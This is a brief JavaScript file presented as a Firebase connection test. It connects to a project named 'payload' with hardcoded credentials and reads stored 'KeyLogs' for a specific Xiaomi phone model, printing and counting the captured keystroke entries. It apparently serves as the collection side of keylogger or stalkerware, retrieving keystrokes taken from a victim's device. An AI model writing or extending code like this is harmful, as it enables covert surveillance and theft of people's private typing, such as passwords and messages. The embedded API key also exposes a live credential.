// Simple Firebase connection test
import { initializeApp } from "firebase/app";
import { getDatabase, ref, get } from "firebase/database";

const firebaseConfig = {
  apiKey: "AIzaSyDAXJOpQaY6auUc9xBV3EwWeMaqG4FJ9Xk",
  authDomain: "payload-fea30.firebaseapp.com",
  databaseURL: "https://payload-fea30-default-rtdb.asia-southeast1.firebasedatabase.app",
  projectId: "payload-fea30",
  storageBucket: "payload-fea30.firebasestorage.app",
  messagingSenderId: "548911851830",
  appId: "1:548911851830:web:db0eb8754598876037eb97"
};

const app = initializeApp(firebaseConfig);
const database = getDatabase(app);

async function testConnection() {
  try {
    console.log('Testing Firebase connection...');
    
    // Test reading KeyLogs for Xiaomi 23076PC4BI
    const snapshot = await get(ref(database, 'KeyLogs/Xiaomi 23076PC4BI'));
    const data = snapshot.val();
    
    if (data) {
      console.log('✅ KeyLogs found for Xiaomi 23076PC4BI:');
      console.log('Data:', JSON.stringify(data, null, 2));
      
      // Count total entries
      const totalEntries = Object.values(data).reduce((total, log) => {
        if (log.Column1) total += 6; // Each log has 6 columns
        return total;
      }, 0);
      
      console.log(`Total key entries: ${totalEntries}`);
    } else {
      console.log('❌ No KeyLogs found for Xiaomi 23076PC4BI');
    }
    
    process.exit(0);
  } catch (error) {
    console.error('❌ Error:', error);
    process.exit(1);
  }
}

// Add timeout
setTimeout(() => {
  console.log('⏰ Timeout - forcing exit');
  process.exit(0);
}, 5000);

testConnection();
